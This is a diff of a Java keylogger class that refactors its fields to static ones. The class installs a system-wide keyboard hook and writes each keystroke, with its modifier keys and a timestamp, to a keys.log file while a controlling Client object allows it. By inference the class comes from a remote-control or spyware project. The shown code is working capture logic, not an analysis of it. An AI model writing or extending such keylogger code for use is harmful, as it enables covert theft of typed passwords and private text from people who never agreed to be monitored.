@@ -16,30 +16,35 @@ public class KeyLogger extends Thread {
 	
 	private static final String LOG_FILE = "keys.log";
 	
-	private Client client;
+	private static final GlobalKeyListener globalKeyListener;
+	private static final KeyListener listener;
 	
-	public KeyLogger(Client client) {
-		this.client = client;
-	}
-	
-	@Override
-	public void run(){
-				
-		GlobalKeyListener globalKeyListener = new GlobalKeyListener();
+	static {
+		globalKeyListener = new GlobalKeyListener();
 		
-		KeyListener listener = new KeyListener(){
+		listener = new KeyListener() {
 
 			@Override
 			public void keyPressed(KeyEvent arg0) {
 				log(arg0.getVirtualKeyCode() + "\t" + arg0.isShiftPressed()
-					+ "\t" + arg0.isAltPressed() + "\t" + arg0.isCtrlPressed());				
+					+ "\t" + arg0.isAltPressed() + "\t" + arg0.isCtrlPressed());
 			}
 
 			@Override
 			public void keyReleased(KeyEvent arg0) {}
 			
 		};
-		
+	}
+	
+	private static Client client;
+	
+	public KeyLogger(Client client) {
+		KeyLogger.client = client;
+	}
+	
+	@Override
+	public void run(){
+						
 		globalKeyListener.addKeyListener(listener);
 		
 		while (client.doLogKeyboard()) {
@@ -52,7 +57,7 @@ public class KeyLogger extends Thread {
 		
 	}
 	
-	private void log(String event) {
+	private static void log(String event) {
 		
 		String timestamp = SDF.format(
 				new Timestamp(System.currentTimeMillis()));
@@ -67,7 +72,7 @@ public class KeyLogger extends Thread {
 		append(line);
 	}
 	
-	private void append(String event) {
+	private static void append(String event) {
 		try {
 			PrintWriter out = new PrintWriter(new FileWriter(LOG_FILE, true));
 			out.println(event);
